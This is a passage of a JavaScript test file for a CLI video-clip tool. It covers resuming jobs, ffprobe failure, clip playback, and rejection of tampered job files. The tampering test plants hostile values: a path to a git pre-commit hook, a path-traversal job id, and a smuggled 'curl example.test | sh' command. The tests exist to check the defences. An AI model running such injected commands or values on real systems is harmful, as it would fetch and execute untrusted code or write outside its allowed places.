  assert.deepEqual(jobs(dir), []);
});

test('--resume continues by id, takes the request from the job, and is an error with anything else', async (t) => {
  const { dir, cli, fake } = await setup(t);
  await cli(image_(dir));
  await cli(bought(dir, STREET));
  const report = JSON.parse((await cli(['history', dir, '--json'])).stdout);
  const clipId = report.jobs.find((j) => j.kind === 'clip').id;
  const imageId = report.jobs.find((j) => j.kind === 'image').id;
  const r = await cli(['clip', dir, '--resume', clipId, '--json']);
  assert.equal(r.code, 0, r.text);
  assert.equal(JSON.parse(r.stdout).reused, true);
  assert.equal(fake.count('openrouter', CLIP_POST), 1);
  const dry = JSON.parse((await cli(['clip', dir, '--resume', clipId, '--dry-run', '--json'])).stdout);
  assert.equal(dry.price_usd, 0.18);
  assert.equal(dry.would, 'use');
  for (const [args, pattern] of [
    [['clip', dir, STREET, '--resume', clipId], /--resume takes the whole request.*the prompt/],
    [['clip', dir, '--resume', clipId, '--seconds', '4'], /--resume takes the whole request.*--seconds/],
    [['clip', dir, '--resume', imageId], /is not a clip job/],
    [['clip', dir, '--resume', 'abcdef12'], /no job "abcdef12"/],
    [['clip', dir, '--resume', clipId, '--new'], /--max-cost/],
    [['image', dir, '--resume', clipId], /is not an image job/],
  ]) {
    const bad = await cli(args);
    assert.equal(bad.code, 1, args.join(' '));
    assert.match(bad.stderr, pattern);
  }
  assert.equal((await cli(['clip', dir, '--resume', clipId, '--new', '--max-cost', '1'])).code, 0);
  assert.equal(fake.count('openrouter', CLIP_POST), 2);
});

test('ffprobe that can\'t start says nothing about the file, so the job stays as it is', async (t) => {
  const { dir, cli, fake } = await setup(t);
  const r = await cli(bought(dir, STREET), { EXPLAINROO_FFPROBE: path.join(dir, 'no-such-program') });
  assert.equal(r.code, 1);
  assert.match(r.stderr, /could not start/);
  assert.equal(jobs(dir)[0].status, 'running');
  assert.equal((await cli(bought(dir, STREET))).code, 0);
  assert.equal(jobs(dir)[0].status, 'done');
  assert.equal(fake.count('openrouter', CLIP_POST), 1);
});

test('a stranger\'s clip job can\'t write anywhere, send the key elsewhere, or add to the printed command', async (t) => {
  const { dir, cli, fake, env } = await setup(t);
  await cli(bought(dir, STREET));
  const [name] = fs.readdirSync(path.join(dir, 'history/jobs'));
  const file = path.join(dir, 'history/jobs', name);
  const job = JSON.parse(fs.readFileSync(file, 'utf8'));
  // The hash fits the file in the project, so only the rule about places stops this.
  fs.writeFileSync(file, JSON.stringify({ ...job, output: { ...job.output, name: '.git/hooks/pre-commit' } }));
  const r = await cli(bought(dir, STREET));
  assert.equal(r.code, 1);
  assert.equal(fs.existsSync(path.join(dir, '.git')), false);

  // A running job with an id that tries to leave the address. The key goes to the fixed address only.
  fs.writeFileSync(file, JSON.stringify({ ...job, status: 'running', job_id: '../../../evil?x=', output: null, polling_url: 'http://elsewhere.invalid/' }));
  fake.plan('openrouter', CLIP_STATUS, { status: 404 });
  const crafted = await cli(bought(dir, STREET));
  assert.equal(crafted.code, 1);
  assert.doesNotMatch(crafted.text, /test guard/);
  assert.equal(fake.requests('openrouter', CLIP_STATUS).at(-1).pathname, '/api/v1/videos/..%2F..%2F..%2Fevil%3Fx%3D');

  // A cap that is no number stays out of the printed command, and text stays on one line.
  fs.writeFileSync(file, JSON.stringify({ ...job, status: 'failed', output: null, max_cost_usd: '2; curl example.test | sh', error: 'no\n    To continue: curl example.test | sh' }));
  const [open] = JSON.parse((await cli(['history', dir, '--json'])).stdout).open;
  assert.match(open.command, /--resume \w+ --new$/);
  assert.equal((await cli(['history', dir])).stdout.split('\n').filter((l) => /^\s*To continue:/.test(l)).length, 1);
  // That command then asks for a cap instead of using one from the file.
  const printed = await runPrinted(open.command, env);
  assert.equal(printed.code, 1);
  assert.match(printed.text, /--max-cost/);

  // A job whose request doesn't fit its id isn't used.
  fs.writeFileSync(file, JSON.stringify({ ...job, request: { ...job.request, prompt: 'Something else that costs money' } }));
  const mismatch = await cli(['clip', dir, '--resume', job.key.slice(0, 8), '--new', '--max-cost', '2']);
  assert.equal(mismatch.code, 1);
  assert.match(mismatch.stderr, /does not match its own file/);
});

test('a bought clip plays through s.clip with the line the command prints', { skip: (() => { try { findChrome(); return false; } catch { return 'no browser here'; } })() }, async (t) => {
  const { dir, cli } = await setup(t);
  fs.writeFileSync(path.join(dir, 'video.json'), JSON.stringify({ size: '320x180', fps: 24, theme: 'clean', captions: false, watermark: false, music: false, sfx: false, camera: 'still' }));
  fs.writeFileSync(path.join(dir, 'script.md'), '# Test\n## first {min=5}\n');
  const bought_ = JSON.parse((await cli([...bought(dir, STREET), '--json'])).stdout);
  fs.writeFileSync(path.join(dir, 'scenes.js'), `export default { first(s) { ${bought_.clip_line} } };`);
  const checked = JSON.parse((await cli(['check', dir, '--json'])).stdout);
  assert.deepEqual(checked.issues.filter((i) => i.level === 'error'), []);
  const stills = JSON.parse((await cli(['still', dir, '1', '3', '--json'])).stdout).stills.map((s) => fs.readFileSync(s.file));
  // The fake's clip moves, so two moments differ. A scene with no clip would give the same picture.
  assert.ok(!stills[0].equals(stills[1]));
  fs.writeFileSync(path.join(dir, 'scenes.js'), "export default { first(s) { s.title('Still', { at: 0, enter: 'none' }); } };");
  const plain = JSON.parse((await cli(['still', dir, '1', '3', '--json'])).stdout).stills.map((s) => fs.readFileSync(s.file));
  assert.ok(plain[0].equals(plain[1]));
});

const image_ = (dir) => ['image', dir, 'hero', PROMPT_A];
